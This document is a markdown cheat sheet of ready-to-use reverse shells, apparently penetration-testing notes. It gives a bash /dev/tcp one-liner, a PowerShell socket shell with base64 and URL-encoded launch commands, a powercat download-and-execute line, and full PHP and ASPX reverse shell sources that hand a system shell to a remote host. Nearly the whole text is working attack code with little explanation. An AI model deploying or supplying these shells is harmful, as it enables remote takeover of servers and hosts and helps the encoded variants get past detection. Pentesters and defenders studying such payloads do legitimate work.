# TCP reverse shell
## bash
```
bash -c "bash -i >& /dev/tcp/192.168.x.x/4444 0>&1"
```
## powershell

### reverse shell with base64 encoding
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.232",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

execute command
```
powershell -enc <EncodedText>
```

execute command(url encoding)
```
powershell%20-enc%20<EncodedText>
```

### powercat
copy current directory
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

remote download
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.x.x/powercat.ps1");powercat -c 192.168.x.x -p 4444 -e powershell 
```

# PHP reverse shell
```
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

# ASPX Reverse Shell
save aspx file
```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">

    // Simple reverse shell for ASPX. For educational purposes only!

    const string IP = "<IP>";
    const ushort PORT = <PORT>;

    const uint CREATE_NO_WINDOW = 0x08000000;
    const Int32 Startf_UseStdHandles = 0x00000100;

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES {
      public int    Length;
      public IntPtr lpSecurityDescriptor;
      public bool   bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool CreateProcess(
       string lpApplicationName,
       string lpCommandLine,
       ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes,
       bool bInheritHandles,
       uint dwCreationFlags,
       IntPtr lpEnvironment,
       string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo,
                                            [In] uint group,
                                            [In] int flags
                                            );


    [DllImport("ws2_32.dll")]
    public static extern int connect(IntPtr s, ref sockaddr_in addr, int addrsize);

    [DllImport("ws2_32.dll")]
    public static extern ushort htons(ushort hostshort);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi)]
    public static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int closesocket(IntPtr s);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    static extern Int32 WSAGetLastError();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr socket;
        SpawnShell(IP, PORT, out socket);

        if( socket != IntPtr.Zero ) {
            closesocket(socket);
        }
    }

    protected void SpawnShell(string IP, ushort PORT, out IntPtr socket)
    {
        int error;
        socket = IntPtr.Zero;

        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);
        error = WSAGetLastError();

        if( error != 0 ) {
            Response.Write("[-] WSASocket failed with error code: " + error + "\n");
            return;
        }

        sockaddr_in sockinfo = new sockaddr_in();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(IP);
        sockinfo.sin_port = (short)htons(PORT);

        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = WSAGetLastError();
            Response.Write("[-] connect failed with error code: " + error + "\n");
            return;
        }

        string command = Environment.GetEnvironmentVariable("comspec");
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        STARTUPINFO si = new STARTUPINFO();
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);

        si.dwFlags = Startf_UseStdHandles;
        si.hStdInput = socket;
        si.hStdOutput = socket;
        si.hStdError = socket;

        if( !CreateProcess(command, "", ref sa, ref sa, true, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi) ) {
            error = Marshal.GetLastWin32Error();
            Response.Write("[-] CreateProcess failed with error: " + error + "\n");
            return;
        }

        Response.Write("[+] Process Created.\n");
    }
</script>
```